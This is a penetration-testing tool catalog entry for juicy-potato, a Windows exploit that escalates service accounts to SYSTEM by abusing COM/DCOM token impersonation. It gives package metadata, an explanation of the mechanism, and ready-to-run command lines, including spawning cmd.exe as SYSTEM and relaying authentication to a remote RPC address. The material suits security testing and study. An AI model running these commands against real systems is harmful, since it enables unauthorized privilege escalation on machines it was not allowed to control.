---
name: "juicy-potato"
categories:
  - blackarch-windows
version: "53.744d321"
homepage: "https://github.com/ohpe/juicy-potato"
packaged-by: [blackarch]
blackarch-builddate: "2021-03-13"
build-system: windows
license: GPL3
meta-checked: "2026-11-09"
github-repo: "ohpe/juicy-potato"
github-stars: 2855
github-pushed: "2021-12-18"
github-archived: false
github-issues: 14
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# juicy-potato

> Local privilege escalation from Windows service accounts to NT AUTHORITY\SYSTEM by abusing COM/DCOM servers.

## What it's for

JuicyPotato (by Andrea Pierini and Giuseppe Trotta; a sugared RottenPotatoNG) escalates a Windows service account holding `SeImpersonate` or `SeAssignPrimaryToken` to SYSTEM. It abuses COM servers that are instantiable by the current user, implement `IMarshal`, and run as a privileged user: it instantiates one (chosen by CLSID), traps the marshalled OXID resolution on its own local COM listener, and reuses the captured SYSTEM token to spawn a process. Unlike RottenPotato it is not tied to BITS and port 6666 — any CLSID from the tested per-OS lists (shipped in the package's `CLSID/` directory, covering Windows 7 through Server 2016) can be targeted, and the COM and RPC listener addresses and ports are selectable. It does nothing without those privileges, and it does not work on Windows versions whose COM servers cannot be abused this way.

## Typical use cases

### Spawn a program as SYSTEM with the default BITS CLSID

```
JuicyPotato.exe -t * -p cmd.exe -l 13414
```

Outcome: tries both process-creation paths (`-t *` = CreateProcessWithTokenW then CreateProcessAsUser); on success `cmd.exe` runs as NT AUTHORITY\SYSTEM. Requires `SeImpersonate` or `SeAssignPrimaryToken`.

### Launch a program with arguments

```
JuicyPotato.exe -t * -p cmd.exe -a "/c whoami > C:\Temp\out.txt" -l 13414
```

Outcome: `-a` passes the argument string to the launched program; on a successful run `C:\Temp\out.txt` contains the `nt authority\system` whoami output.

### Target a specific CLSID when BITS is unavailable

```
JuicyPotato.exe -t * -p cmd.exe -l 13414 -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Outcome: instantiates the named COM server instead of the default; when the BITS service is disabled or the default CLSID fails, pick another CLSID from the shipped per-OS `CLSID/` lists.

### Test candidate CLSIDs without launching anything

```
JuicyPotato.exe -t * -p cmd.exe -l 13414 -z
```

Outcome: test mode — creates the DCOM object and prints the user of the token that would be impersonated, without spawning the program; useful to validate a CLSID list on a new Windows build.

### Relay OXID resolution to an external RPC endpoint

```
JuicyPotato.exe -t * -p cmd.exe -l 13414 -k 198.51.100.10
```

Outcome: sends the DCOM authentication to the RPC server at 198.51.100.10 instead of localhost (RPC port defaults to 135, change it with `-n`), for setups where local RPC is blocked or a remote endpoint is preferred.
